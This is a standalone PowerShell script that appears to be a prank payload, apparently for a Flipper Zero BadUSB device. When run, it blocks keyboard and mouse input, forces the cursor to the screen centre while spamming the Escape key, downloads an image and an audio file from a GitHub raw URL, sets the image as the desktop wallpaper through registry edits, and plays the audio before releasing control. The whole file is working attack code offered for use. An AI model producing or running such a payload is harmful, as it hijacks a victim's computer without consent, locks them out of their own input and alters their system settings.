Add-Type -MemberDefinition @"
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool BlockInput(bool fBlockIt);
"@ -Name "InputBlocker" -Namespace "Win32"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("User32.dll")]
    public static extern bool SetCursorPos(int X, int Y);
}
"@

$workingArea = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea
$centerX = [int]($workingArea.X + ($workingArea.Width / 2))
$centerY = [int]($workingArea.Y + ($workingArea.Height / 2))

$loopJob = Start-Job -ScriptBlock {
    while ($true) {
        [User32]::SetCursorPos($using:centerX, $using:centerY) | Out-Null
        [System.Windows.Forms.SendKeys]::SendWait("{ESC}")
        Start-Sleep -Milliseconds 5
    }
}

$imageUrl = "https://raw.githubusercontent.com/SoGiovaaah/flipperzeropariamentotime/refs/heads/main/python.png"
$audioUrl = "https://raw.githubusercontent.com/SoGiovaaah/flipperzeropariamentotime/refs/heads/main/python.wav"
$imagePath = "$env:TEMP\sfondo.png"
$audioPath = "$env:TEMP\e.wav"

$downloadJobs = @(
    Start-Job -ScriptBlock { Invoke-WebRequest -Uri $using:imageUrl -OutFile $using:imagePath -UseBasicParsing },
    Start-Job -ScriptBlock { Invoke-WebRequest -Uri $using:audioUrl -OutFile $using:audioPath -UseBasicParsing }
)
Wait-Job -Job $downloadJobs
$downloadJobs | Remove-Job

Function Set-WallPaper {
    param(
        [Parameter(Mandatory=$true)][string]$Image,
        [Parameter()][ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')][string]$Style
    )
    $WallpaperStyle = switch ($Style) {
        "Fill"    { "10" }
        "Fit"     { "6"  }
        "Stretch" { "2"  }
        "Tile"    { "0"  }
        "Center"  { "0"  }
        "Span"    { "22" }
    }
    if ($Style -eq "Tile") {
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
    }
    else {
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
    }
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Params {
        [DllImport("User32.dll", CharSet = CharSet.Unicode)]
        public static extern int SystemParametersInfo(Int32 uAction, Int32 uParam, String lpvParam, Int32 fuWinIni);
    }
"@
    $SPI_SETDESKWALLPAPER = 0x0014
    $fWinIni = 0x01 -bor 0x02
    [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni) | Out-Null
}

Set-WallPaper -Image $imagePath -Style Fill

[Win32.InputBlocker]::BlockInput($true) | Out-Null

$player = New-Object System.Media.SoundPlayer
$player.SoundLocation = $audioPath
$player.PlaySync()

$loopJob | Stop-Job
$loopJob | Remove-Job

[Win32.InputBlocker]::BlockInput($false) | Out-Null
exit
